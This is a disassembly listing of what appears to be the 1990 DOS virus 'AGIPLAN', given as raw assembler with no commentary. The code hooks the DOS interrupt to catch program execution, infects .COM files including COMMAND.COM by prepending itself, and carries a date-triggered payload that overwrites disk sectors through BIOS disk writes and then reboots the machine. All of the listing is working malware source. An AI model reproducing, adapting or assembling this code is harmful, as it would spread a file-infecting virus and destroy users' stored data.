  
PAGE  59,132
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        AGIPLAN				         €€
;€€								         €€
;€€      Created:   1-Sep-90					         €€
;€€      Version:						         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
movseg		 macro reg16, unused, Imm16     ; Fixup for Assembler
		 ifidn	<reg16>, <bx>
		 db	0BBh
		 endif
		 ifidn	<reg16>, <cx>
		 db	0B9h
		 endif
		 ifidn	<reg16>, <dx>
		 db	0BAh
		 endif
		 ifidn	<reg16>, <si>
		 db	0BEh
		 endif
		 ifidn	<reg16>, <di>
		 db	0BFh
		 endif
		 ifidn	<reg16>, <bp>
		 db	0BDh
		 endif
		 ifidn	<reg16>, <sp>
		 db	0BCh
		 endif
		 ifidn	<reg16>, <BX>
		 db	0BBH
		 endif
		 ifidn	<reg16>, <CX>
		 db	0B9H
		 endif
		 ifidn	<reg16>, <DX>
		 db	0BAH
		 endif
		 ifidn	<reg16>, <SI>
		 db	0BEH
		 endif
		 ifidn	<reg16>, <DI>
		 db	0BFH
		 endif
		 ifidn	<reg16>, <BP>
		 db	0BDH
		 endif
		 ifidn	<reg16>, <SP>
		 db	0BCH
		 endif
		 dw	seg Imm16
endm
data_1e		equ	46Dh			; (0000:046D=0B35h)
data_2e		equ	600h			; (0000:0600=54h)
data_3e		equ	0Eh			; (0A10:000E=1)
data_4e		equ	1			; (936D:0001=0FFFFh)
data_5e		equ	0			; (936E:0000=0)
data_6e		equ	2			; (936E:0002=0)
data_7e		equ	12h			; (936E:0012=0)
data_8e		equ	14h			; (936E:0014=936Eh)
data_9e		equ	0F0h			; (936E:00F0=0)
data_10e	equ	0F6h			; (936E:00F6=0)
data_11e	equ	0FAh			; (936E:00FA=0)
data_12e	equ	0FEh			; (936E:00FE=0)
data_45e	equ	2Ch			; (93CE:002C=0FFFFh)
data_46e	equ	5B0h			; (93CE:05B0=41h)
data_47e	equ	600h			; (93CE:0600=41h)
data_48e	equ	1			; (FFFE:0001=0)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
agiplan		proc	far
  
start:
		jmp	loc_43			; (04CF)
data_14		db	'êêêêêúP1¿.8&⁄', 5, 'u', 7, 'Xù.', 0FFh
		db	'.Ë', 5, 'É', 0FFh, 0
		db	 75h,0F4h, 58h
data_15		db	9Dh
		db	0B8h, 03h, 00h,0CFh, 90h, 90h
		db	 90h
data_16		db	0
		db	 90h, 00h,0FFh,0FFh,0FFh,0FFh
		db	0FFh
  
agiplan		endp
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;			External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_21h_entry	proc	far
		pushf				; Push flags
		cmp	ah,4Eh			; 'N'
		jne	loc_4			; Jump if not equal
		jmp	short loc_8		; (0154)
loc_4:
		cmp	ah,4Bh			; 'K'
		jne	loc_5			; Jump if not equal
		jmp	short loc_8		; (0154)
loc_5:
		cmp	ah,0Eh
		jne	loc_6			; Jump if not equal
		jmp	short loc_8		; (0154)
loc_6:
		cmp	ah,40h			; '@'
		jne	loc_7			; Jump if not equal
		jmp	short loc_8		; (0154)
loc_7:
		popf				; Pop flags
		jmp	dword ptr cs:data_35	; (936E:05E4=138Dh)
		db	90h
loc_8:
		cli				; Disable interrupts
		push	es
		push	ds
		push	di
		push	si
		push	bp
		push	dx
		push	cx
		push	bx
		push	ax
		mov	cs:data_31,ss		; (936E:05DB=0A10h)
		mov	cs:data_32,sp		; (936E:05DD=743h)
		mov	al,0FFh
		mov	cs:data_30,al		; (936E:05DA=0FFh)
		mov	ax,3524h
		int	7Eh			; ??INT Non-standard interrupt.
		cmp	word ptr cs:data_37,bx	; (936E:05E8=4EBh)
		jne	loc_9			; Jump if not equal
		mov	ax,2524h
		mov	dx,108h
		push	cs
		pop	ds
		int	7Eh			; ??INT Non-standard interrupt.
loc_9:
		sti				; Enable interrupts
		jmp	short loc_11		; (01AA)
loc_10:
		cli				; Disable interrupts
		xor	ax,ax			; Zero register
		mov	cs:data_30,ah		; (936E:05DA=0FFh)
		mov	ss,cs:data_31		; (936E:05DB=0A10h)
		mov	sp,cs:data_32		; (936E:05DD=743h)
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
		popf				; Pop flags
		sti				; Enable interrupts
		jmp	dword ptr cs:data_35	; (936E:05E4=138Dh)
		db	90h
loc_11:
		pop	ax
		pop	bx
		push	bx
		push	ax
		cmp	ah,4Bh			; 'K'
		je	loc_16			; Jump if equal
		cmp	ah,40h			; '@'
		jne	loc_12			; Jump if not equal
		jmp	short loc_15		; (01CC)
loc_12:
		cmp	ah,0Eh
		jne	loc_13			; Jump if not equal
		jmp	short loc_10		; (0187)
loc_13:
		cmp	ah,4Eh			; 'N'
		jne	loc_10			; Jump if not equal
		jmp	short loc_10		; (0187)
		db	90h
loc_14:
		jmp	loc_23			; (0283)
loc_15:
		mov	ax,0Fh
		cmp	cs:data_29,al		; (936E:05D9=0)
		jb	loc_10			; Jump if below
		ja	loc_14			; Jump if above
		cmp	bx,4
		jbe	loc_10			; Jump if below or =
		mov	bx,1
		push	cs
		pop	ds
		add	ds:data_11e,bx		; (936E:00FA=0)
		mov	ah,2Ch			; ','
		int	7Eh			; ??INT Non-standard interrupt.
		cmp	dh,ds:data_11e		; (936E:00FA=0)
		ja	loc_10			; Jump if above
		mov	bx,data_3e		; (0A10:000E=1)
		add	bx,data_32		; (936E:05DD=743h)
		mov	ss:[bx],bx
		jmp	short loc_10		; (0187)
		db	 01h, 90h, 90h, 90h
loc_16:
		mov	cs:data_33,dx		; (936E:05DF=3D7Bh)
		mov	cs:data_34,ds		; (936E:05E1=7B6Eh)
		push	cs
		pop	ds
		mov	ah,2Ch			; ','
		int	7Eh			; ??INT Non-standard interrupt.
		cmp	dh,ds:data_12e		; (936E:00FE=0)
		jb	loc_17			; Jump if below
		jmp	loc_10			; (0187)
loc_17:
		mov	dx,data_33		; (936E:05DF=3D7Bh)
		mov	ds,data_34		; (936E:05E1=7B6Eh)
		push	ax
		mov	al,2Eh			; '.'
		cld				; Clear direction
		push	ds
		push	dx
		cli				; Disable interrupts
		mov	di,dx
		push	ds
		pop	es
		mov	cx,20h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		jnz	loc_20			; Jump if not zero
		push	cs
		pop	ds
		mov	si,offset data_21	; (936E:05C8=43h)
		mov	cx,3
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_22			; Jump if not zero
		sub	di,0Bh
		mov	si,offset data_20	; (936E:05C0=43h)
		mov	cx,0Bh
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		mov	dh,0FFh
		mov	cs:data_16,dh		; (936E:0128=0)
		jz	loc_18			; Jump if zero
		xor	dx,dx			; Zero register
		mov	cs:data_16,dh		; (936E:0128=0)
loc_18:
		add	sp,6
		push	cs
		pop	ds
loc_19:
		call	sub_2			; (02C0)
loc_20:
		jmp	loc_10			; (0187)
		db	 90h, 90h
loc_21:
;*		jmp	loc_34			;*(03E0)
		db	0E9h, 76h, 01h
loc_22:
		add	sp,6
		push	cs
		pop	ds
		mov	dx,5C0h
		mov	data_33,dx		; (936E:05DF=3D7Bh)
		mov	data_34,ds		; (936E:05E1=7B6Eh)
		mov	dh,0FFh
		mov	data_16,dh		; (936E:0128=0)
		jmp	short loc_19		; (025F)
		db	90h
loc_23:
		mov	cx,501h
		mov	dx,100h
		call	sub_1			; (02A0)
		mov	dx,101h
		call	sub_1			; (02A0)
		mov	dx,380h
		call	sub_1			; (02A0)
		mov	dx,381h
		call	sub_1			; (02A0)
		int	19h			; Bootstrap loader
int_21h_entry	endp
  
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_1		proc	near
		push	dx
loc_24:
		mov	ax,309h
		int	13h			; Disk  dl=drive a  ah=func 03h
						;  write sectors from mem es:bx
		sub	dh,1
		cmp	dh,0
		jge	loc_24			; Jump if > or =
		pop	dx
		push	dx
		sub	cx,100h
		cmp	cx,0
		jge	loc_24			; Jump if > or =
		retn
sub_1		endp
  
		db	 90h, 90h, 90h
loc_25:
		jmp	loc_31			; (03A3)
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_2		proc	near
		mov	ah,48h			; 'H'
		mov	bx,0FFFh
		int	7Eh			; ??INT Non-standard interrupt.
		jc	loc_21			; Jump if carry Set
		nop
		mov	ds:data_11e,ax		; (936E:00FA=0)
		mov	dx,data_33		; (936E:05DF=3D7Bh)
		mov	ds,data_34		; (936E:05E1=7B6Eh)
		mov	ah,3Ah			; ':'
		mov	bx,dx
		add	bx,1
		cmp	ah,[bx]
		mov	ah,0
		jnz	loc_27			; Jump if not zero
		mov	bx,dx
		mov	al,50h			; 'P'
		mov	ah,[bx]
		cmp	ah,50h			; 'P'
		ja	loc_26			; Jump if above
		sub	ah,40h			; '@'
		jmp	short loc_27		; (02F5)
loc_26:
		sub	ah,60h			; '`'
loc_27:
		mov	dl,ah
		mov	ah,36h			; '6'
		int	7Eh			; ??INT Non-standard interrupt.
		cmp	bx,9
		jb	loc_25			; Jump if below
		mov	dx,cs:data_33		; (936E:05DF=3D7Bh)
		mov	ax,4300h
		int	7Eh			; ??INT Non-standard interrupt.
		mov	cs:data_39,cx		; (936E:05EC=20h)
		mov	ax,4301h
		xor	cx,cx			; Zero register
		int	7Eh			; ??INT Non-standard interrupt.
		nop
		mov	ax,3D42h
		int	7Eh			; ??INT Non-standard interrupt.
		jc	loc_25			; Jump if carry Set
		mov	bx,ax
		mov	ah,3Fh			; '?'
		mov	cx,0FFFFh
		mov	dx,600h
		mov	ds,cs:data_11e		; (936E:00FA=0)
		int	7Eh			; ??INT Non-standard interrupt.
		jc	loc_30			; Jump if carry Set
		add	ax,600h
		mov	cs:data_10e,ax		; (936E:00F6=0)
		cmp	ax,1000h
		jb	loc_30			; Jump if below
		cmp	ax,0D000h
		ja	loc_30			; Jump if above
		mov	si,offset ds:[100h]	; (936E:0100=0E9h)
		push	cs
		pop	ds
		xor	di,di			; Zero register
		mov	es,cs:data_11e		; (936E:00FA=0)
		mov	cx,2FFh
		cld				; Clear direction
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		push	es
		pop	ds
		xor	di,di			; Zero register
		mov	si,data_2e		; (0000:0600=54h)
		mov	cx,10h
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_30			; Jump if zero
		mov	ah,cs:data_16		; (936E:0128=0)
		cmp	ah,0FFh
		jne	loc_28			; Jump if not equal
		call	sub_3			; (03C8)
		jmp	short loc_29		; (0377)
loc_28:
		mov	ax,9090h
		mov	ds:data_1e,ax		; (0000:046D=0B35h)
loc_29:
		nop
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	7Eh			; ??INT Non-standard interrupt.
		mov	ax,5700h
		int	7Eh			; ??INT Non-standard interrupt.
		push	cx
		push	dx
		mov	ah,40h			; '@'
		mov	cx,cs:data_10e		; (936E:00F6=0)
		xor	dx,dx			; Zero register
		mov	ds,cs:data_11e		; (936E:00FA=0)
		int	7Eh			; ??INT Non-standard interrupt.
		pop	dx
		pop	cx
		mov	ax,5701h
		int	7Eh			; ??INT Non-standard interrupt.
loc_30:
		mov	ah,3Eh			; '>'
		int	7Eh			; ??INT Non-standard interrupt.
loc_31:
		mov	cx,cs:data_39		; (936E:05EC=20h)
		mov	dx,cs:data_33		; (936E:05DF=3D7Bh)
		mov	ds,cs:data_34		; (936E:05E1=7B6Eh)
		mov	ax,4301h
loc_32:
		int	7Eh			; ??INT Non-standard interrupt.
		push	cs
		pop	ds
		mov	es,cs:data_11e		; (936E:00FA=0)
		mov	ah,49h			; 'I'
		int	7Eh			; ??INT Non-standard interrupt.
		retn
sub_2		endp
  
		db	 90h, 90h, 90h, 90h, 90h
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_3		proc	near
		mov	ax,0D08Eh
		mov	ds:data_1e,ax		; (0000:046D=0B35h)
		mov	di,data_2e		; (0000:0600=54h)
		mov	cx,3000h
		mov	ax,0B8C9h
loc_33:
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	ah,es:[di]
		jne	loc_33			; Jump if not equal
		mov	dx,4200h
		cmp	dx,es:[di+1]
		jne	loc_33			; Jump if not equal
		mov	dh,0BAh
		cmp	dh,es:[di-5]
		jne	loc_33			; Jump if not equal
		cmp	cx,0
		jne	loc_35			; Jump if not equal
		pop	dx
		jmp	short loc_32		; (03B5)
		db	90h
loc_35:
		mov	dx,es:[di-4]
		add	dx,600h
		mov	es:[di-4],dx
		retn
sub_3		endp
  
		db	11 dup (90h)
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_4		proc	near
		mov	ax,4A00h
		mov	bx,5Fh
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	bx,cs
		sub	bx,1
		mov	ds,bx
		mov	ax,0FFFFh
		mov	ds:data_4e,ax		; (936D:0001=0FFFFh)
		push	cs
		pop	ds
		mov	ax,4800h
		mov	bx,0FFFFh
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		mov	ax,4800h
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		retn
sub_4		endp
  
		db	0CBh
		db	26 dup (90h)
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_5		proc	near
		mov	cx,10h
		mov	si,offset data_15	; (936E:0120=9Dh)
		mov	di,data_9e		; (936E:00F0=0)
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	cx,data_25		; (936E:05D1=7BCh)
		ja	loc_38			; Jump if above
		jc	loc_36			; Jump if carry Set
		cmp	dx,data_26		; (936E:05D3=701h)
		ja	loc_38			; Jump if above
loc_36:
		cmp	cx,data_27		; (936E:05D5=7BCh)
		ja	loc_39			; Jump if above
		jc	loc_37			; Jump if carry Set
		cmp	dx,data_28		; (936E:05D7=501h)
		ja	loc_39			; Jump if above
loc_37:
		mov	ax,0
		jmp	short loc_40		; (0487)
loc_38:
		or	ax,0F0h
loc_39:
		or	ax,0Fh
loc_40:
		mov	data_29,al		; (936E:05D9=0)
		push	dx
		push	cx
		xor	bx,bx			; Zero register
		call	sub_6			; (04A5)
		pop	cx
		pop	dx
		mov	bx,data_6e		; (936E:0002=0)
		call	sub_6			; (04A5)
		mov	ah,1
		add	data_22,ah		; (936E:05CC=14h)
		nop
		retn
sub_5		endp
  
		db	 90h, 90h, 90h, 90h
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_6		proc	near
		add	dl,data_24[bx]		; (936E:05CE=0)
		cmp	dl,20h			; ' '
		jbe	loc_41			; Jump if below or =
		add	dh,1
		sub	dl,20h			; ' '
loc_41:
		add	dh,data_23[bx]		; (936E:05CD=6)
		cmp	dh,0Bh
		jbe	loc_42			; Jump if below or =
		sub	dh,0Bh
		add	cx,1
loc_42:
		add	bx,bx
		nop
		mov	data_26[bx],dx		; (936E:05D3=701h)
		mov	data_25[bx],cx		; (936E:05D1=7BCh)
		retn
sub_6		endp
  
loc_43:
		push	ax
		mov	al,3Fh			; '?'
		mov	dx,70h
		out	dx,al			; port 70h, RTC addr/enabl NMI
		mov	dx,71h
		in	al,dx			; port 71h, RTC clock/RAM data
		cmp	al,0F0h
		jbe	loc_44			; Jump if below or =
		jmp	loc_47			; (057B)
loc_44:
		mov	ax,357Fh
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ax,ds
		mov	es,ax
		cmp	bx,0FFFFh
		jne	loc_45			; Jump if not equal
		jmp	loc_48			; (0582)
loc_45:
		mov	dx,0FFFFh
		mov	ax,257Fh
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr data_35,bx	; (936E:05E4=138Dh)
		mov	word ptr data_35+2,es	; (936E:05E6=28Ch)
		mov	ax,es
		mov	ds,ax
		mov	dx,bx
		mov	ax,257Eh
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,cs
		mov	es,ax
		mov	ds,ax
		mov	dx,offset int_21h_entry
		mov	ax,2521h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr data_37,bx	; (936E:05E8=4EBh)
		mov	word ptr data_37+2,es	; (936E:05EA=0A10h)
		mov	ax,es
		mov	ds,ax
		mov	dx,bx
		mov	ax,25FDh
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,cs
		mov	es,ax
		mov	ds,ax
		mov	dx,offset int_24h_entry
		mov	ax,2524h
		mov	ds:data_7e,dx		; (936E:0012=0)
		mov	ds:data_8e,ds		; (936E:0014=936Eh)
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		call	sub_5			; (0450)
		call	sub_4			; (0410)
		nop
		nop
		nop
		nop
		nop
loc_46:
		mov	cx,80h
		mov	di,data_47e		; (93CE:0600=41h)
		mov	si,data_5e		; (936E:0000=0)
		cld				; Clear direction
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,ds
		add	ax,60h
		mov	word ptr ds:[579h],ax	; (936E:0579=0E64h)
		nop
		nop
		mov	es,ax
		mov	ds,ax
		pop	ax
		nop
		nop
;*		jmp	far ptr loc_1		;*(0E64:0100)
		db	0EAh, 00h, 01h, 64h, 0Eh
loc_47:
		mov	dx,data_46e		; (93CE:05B0=41h)
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
loc_48:
		mov	ax,4A00h
		mov	bx,5Fh
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	bx,ds:data_45e		; (93CE:002C=0FFFFh)
		sub	bx,1
		xor	ax,ax			; Zero register
		mov	ds,bx
		mov	ds:data_48e,ax		; (FFFE:0001=0)
		mov	bx,cs
		add	bx,60h
		mov	dx,cs
		sub	dx,1
		mov	ds,dx
		mov	ds:data_4e,bx		; (936D:0001=0FFFFh)
		mov	ah,50h			; 'P'
		int	21h			; DOS Services  ah=function 50h
						;  set active PSP segmnt from bx
		push	cs
		pop	ds
		jmp	short loc_46		; (0559)
		db	'load error', 0Dh, 0Ah, '$'
		db	0Ah, '$'
		db	0
data_20		db	'COMMAND.'
data_21		db	43h
		db	 4Fh, 4Dh, 00h
data_22		db	14h
data_23		db	6			; Data table (indexed access)
data_24		db	0			; Data table (indexed access)
		db	4, 0
data_25		dw	7BCh			; Data table (indexed access)
data_26		dw	701h			; Data table (indexed access)
data_27		dw	7BCh
data_28		dw	501h
data_29		db	0
data_30		db	0FFh
data_31		dw	0A10h
data_32		dw	743h
data_33		dw	3D7Bh
data_34		dw	7B6Eh
		db	90h
data_35		dd	28C138Dh
data_37		dd	0A1004EBh
data_39		dw	20h
		db	 90h, 90h, 4Dh, 10h, 0Ah,0FFh
		db	 0Fh
		db	11 dup (90h)
		db	0E9h,0CCh, 03h, 90h, 90h, 90h
		db	 90h, 90h, 9Ch, 50h, 31h,0C0h
		db	 2Eh, 38h, 26h,0DAh, 05h, 75h
		db	 07h
loc_49:
		pop	ax
		popf				; Pop flags
		jmp	cs:data_37		; (936E:05E8=4EBh)
		cmp	di,0
		jne	loc_49			; Jump if not equal
		pop	ax
		popf				; Pop flags
		mov	ax,3
		iret				; Interrupt return
		db	 90h, 90h, 90h, 00h, 90h, 00h
		db	0FFh,0FFh,0FFh,0FFh,0FFh, 9Ch
		db	 80h,0FCh, 4Eh, 75h, 02h,0EBh
		db	 1Ch, 80h,0FCh, 4Bh, 75h, 02h
		db	0EBh, 15h
loc_50:
		cmp	ah,0Eh
		jne	loc_51			; Jump if not equal
		jmp	short loc_53		; (0654)
loc_51:
		cmp	ah,40h			; '@'
		jne	loc_52			; Jump if not equal
		jmp	short loc_53		; (0654)
loc_52:
		popf				; Pop flags
		jmp	cs:data_35		; (936E:05E4=138Dh)
		db	90h
loc_53:
		cli				; Disable interrupts
		push	es
		push	ds
		push	di
		push	si
		push	bp
		push	dx
		push	cx
		push	bx
		push	ax
		mov	cs:data_31,ss		; (936E:05DB=0A10h)
		mov	cs:data_32,sp		; (936E:05DD=743h)
		mov	al,0FFh
		mov	cs:data_30,al		; (936E:05DA=0FFh)
		mov	ax,3524h
		int	7Eh			; ??INT Non-standard interrupt.
		cmp	word ptr cs:data_37,bx	; (936E:05E8=4EBh)
		jne	loc_54			; Jump if not equal
		mov	ax,2524h
		mov	dx,108h
		push	cs
		pop	ds
		int	7Eh			; ??INT Non-standard interrupt.
loc_54:
		sti				; Enable interrupts
		jmp	short loc_56		; (06AA)
loc_55:
		cli				; Disable interrupts
		xor	ax,ax			; Zero register
		mov	cs:data_30,ah		; (936E:05DA=0FFh)
		mov	ss,cs:data_31		; (936E:05DB=0A10h)
		mov	sp,cs:data_32		; (936E:05DD=743h)
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
		popf				; Pop flags
		sti				; Enable interrupts
		jmp	cs:data_35		; (936E:05E4=138Dh)
		db	90h
loc_56:
		pop	ax
		pop	bx
		push	bx
		push	ax
		cmp	ah,4Bh			; 'K'
		je	loc_61			; Jump if equal
		cmp	ah,40h			; '@'
		jne	loc_57			; Jump if not equal
		jmp	short loc_60		; (06CC)
loc_57:
		cmp	ah,0Eh
		jne	loc_58			; Jump if not equal
		jmp	short loc_55		; (0687)
loc_58:
		cmp	ah,4Eh			; 'N'
		jne	loc_55			; Jump if not equal
		jmp	short loc_55		; (0687)
		db	90h
loc_59:
		jmp	loc_62			; (0783)
loc_60:
		mov	ax,0Fh
		cmp	cs:data_29,al		; (936E:05D9=0)
		jb	loc_55			; Jump if below
		ja	loc_59			; Jump if above
		cmp	bx,4
		jbe	loc_55			; Jump if below or =
		mov	bx,1
		push	cs
		pop	ds
		add	ds:data_11e,bx		; (936E:00FA=0)
		mov	ah,2Ch			; ','
		int	7Eh			; ??INT Non-standard interrupt.
		cmp	dh,ds:data_11e		; (936E:00FA=0)
		ja	loc_55			; Jump if above
		mov	bx,data_3e		; (0A10:000E=1)
		add	bx,data_32		; (936E:05DD=743h)
		mov	ss:[bx],bx
		jmp	short loc_55		; (0687)
		db	 01h, 90h, 90h, 90h
loc_61:
		jmp	loc_63			; (1A7F)
		db	'Hello - Copyright S & S Internat'
		db	'ional, 1990', 0Ah, 0Dh, '$'
		db	 1Ah, 41h, 41h
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAA'
loc_62:
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
